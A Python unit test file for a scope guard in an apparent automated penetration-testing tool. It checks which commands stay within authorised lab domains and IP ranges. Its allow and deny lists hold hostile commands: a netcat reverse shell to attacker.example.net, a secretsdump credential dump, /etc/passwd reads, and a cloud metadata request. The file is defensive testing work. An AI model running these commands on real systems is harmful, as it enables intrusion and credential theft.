"""safety/scope 确定性单测（纯 stdlib，`.venv/bin/python tests/safety/test_scope.py`）。

验授权边界：真拦越界（具体 IP / 多标签外部 FQDN）、绝不误杀合法内网横向与本地命令。
"""
import sys, os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from veritas.config import ScopeCfg
from veritas.safety import scope

_fail = 0
def check(name, got, want):
    global _fail
    ok = got == want
    if not ok:
        _fail += 1
        print(f"  ✗ {name}: got={got!r} want={want!r}")
    else:
        print(f"  ✓ {name}")

# 授权边界：veritas.lab 域 + 内网网段 + 一台授权外部主机 203.0.113.10/32（RFC5737 脱敏）
DOM = ["veritas.lab", "lab-dc.veritas.lab", "localhost", "127.0.0.1"]
CIDR = ["127.0.0.0/8", "172.16.0.0/12", "172.30.0.0/16", "203.0.113.10/32"]
sc = ScopeCfg(domains=DOM, cidrs=CIDR)

# 预置 DNS 缓存，让【单标签收紧】确定性可测（不依赖真实解析器）：
scope._dns_cache.update({
    "lab-edge": [],                  # 沙箱内网容器名：engine 侧解析不到 → 放行（不误杀横向）
    "lab-internal": [],
    "evilalias": ["203.0.113.9"],    # 单标签别名解析到 scope 外 IP → 应拒（收紧旧绕过面）
    "memberbox": ["172.20.0.5"],     # 单标签别名解析到内网 IP → 放行
})

print("[extract_targets] 只抽连接目标、不抽 payload")
check("url 只取 authority、query 内 URL 不抽",
      scope.extract_targets("curl 'http://lab-edge:8080/x?u=http://evil.com'"), ["lab-edge"])
check("本地命令无主机", scope.extract_targets("cat /etc/passwd"), [])
check("ssh user@ip 抽到 IP", "172.20.0.5" in scope.extract_targets("ssh root@172.20.0.5 id"), True)
check("脚本名(.py)不当主机", scope.extract_targets("python3 GetUserSPNs.py -h"), [])
check("-H 头里的 FQDN 不抽(是 payload)",
      scope.extract_targets("curl http://lab-edge/ -H 'Referer: http://evil.com'"), ["lab-edge"])
check("payload 里的 IP 仍抽(保守偏严)",
      "203.0.113.9" in scope.extract_targets("curl http://lab-edge/ -d 'ip=203.0.113.9'"), True)

print("[host_in_scope] 单主机判定")
check("授权外部 IP /32 命中", scope.host_in_scope("203.0.113.10", DOM, CIDR), True)
check("邻近未授权 IP 拒绝", scope.host_in_scope("203.0.113.11", DOM, CIDR), False)
check("内网 IP 命中 cidr", scope.host_in_scope("172.20.0.5", DOM, CIDR), True)
check("单标签内网名·解析不到→放行(不误杀横向)", scope.host_in_scope("lab-edge", DOM, CIDR), True)
check("单标签别名·解析到 scope 外 IP→拒(收紧绕过)", scope.host_in_scope("evilalias", DOM, CIDR), False)
check("单标签别名·解析到内网 IP→放行", scope.host_in_scope("memberbox", DOM, CIDR), True)
check("子域放行", scope.host_in_scope("srv.veritas.lab", DOM, CIDR), True)
check("多标签外部 FQDN 拒绝", scope.host_in_scope("evil.com", DOM, CIDR), False)
check("loopback 恒放行", scope.host_in_scope("127.0.0.5", DOM, CIDR), True)
check("::1 放行", scope.host_in_scope("::1", DOM, CIDR), True)
check("localhost 放行", scope.host_in_scope("localhost", DOM, CIDR), True)

print("[allows_cmd] 命令级（经 ScopeCfg）")
ALLOW = [
    "cat /etc/passwd", "echo vz123; id", "ip addr", "sudo -l",
    "curl http://localhost:3000/rest/products",
    "curl http://127.0.0.1:3000/", "curl http://lab-edge:8080/ping",
    "ssh root@172.20.0.5 id", "sshpass -p pw ssh user@172.30.5.9 whoami",
    "nxc smb lab-dc.veritas.lab -u a -p b",
    "impacket-secretsdump -dc-ip 203.0.113.10 veritas.lab/webdev:pw@203.0.113.10 -just-dc",
    "curl 'http://lab-edge:8080/redirect?url=http://evil.com'",      # 开放重定向 payload 不越界
    "curl http://localhost:3000 -A 'Mozilla/5.0 (http://bot.example.com)'",
    "ssh root@memberbox id",                # 单标签别名解析到内网 IP → 放行
]
DENY = [
    "nmap -sV 203.0.113.9",                 # 邻近未授权 IP
    "curl http://192.168.65.1/",            # Docker 网关（实测越界事故）
    "ping -c1 8.8.8.8",
    "curl https://evil.example.com/x",      # 多标签外部 FQDN
    "nc attacker.example.net 4444 -e /bin/sh",
    "ssh user@198.51.100.7 id",
    "curl http://169.254.169.254/latest/meta-data/",   # 云元数据端点
    "curl http://lab-edge/ -d 'ip=203.0.113.9'",       # payload 里越界 IP（保守拦）
    "curl http://evilalias/",                          # 单标签别名解析到 scope 外 IP（收紧后拦）
]
for c in ALLOW:
    check(f"allow: {c[:50]}", sc.allows_cmd(c), True)
for c in DENY:
    check(f"deny : {c[:50]}", sc.allows_cmd(c), False)

print("[allows_cmd] 边界")
check("空 scope → 不强制(放行)", ScopeCfg().allows_cmd("nmap 8.8.8.8"), True)
check("只配 cidr 也生效", ScopeCfg(cidrs=["10.0.0.0/8"]).allows_cmd("ssh u@203.0.113.9"), False)
check("只配 cidr：域内 IP 放行", ScopeCfg(cidrs=["10.0.0.0/8"]).allows_cmd("ssh u@10.1.2.3"), True)

print(f"\n{'FAILED '+str(_fail) if _fail else 'ALL PASS'}  (test_scope)")
sys.exit(1 if _fail else 0)
